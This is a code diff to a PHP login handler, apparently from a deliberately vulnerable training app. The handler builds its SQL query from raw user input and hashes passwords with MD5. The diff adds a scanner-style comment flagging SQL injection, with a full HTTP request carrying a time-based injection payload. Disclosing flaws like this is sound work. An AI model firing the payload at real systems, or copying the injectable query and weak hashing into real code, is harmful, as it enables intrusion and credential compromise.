@@ -5,6 +5,18 @@
 		$username=$_POST['username'];
 		$pwd=md5($_POST['passwd']);
 		$sql="SELECT * FROM users WHERE name='$username' and password='$pwd'";
+		// TODO: AI issue #4, High, SQL Injection, https://github.com/rbm1718/bricks/issues/4
+		//
+		// POST /login-5/index.php HTTP/1.1
+		// Host: localhost
+		// Accept-Encoding: identity
+		// Connection: close
+		// Content-Length: 57
+		// Content-Type: application/x-www-form-urlencoded
+		//
+		// submit=935137890000&username=%27+or+sleep%285%29+%3D+%271
+		//
+		// mysql_select_db(NULL, True)
 		$result=mysql_query($sql);
 		$count=mysql_num_rows($result);
 		$sSuccessMsg = ($count>0?
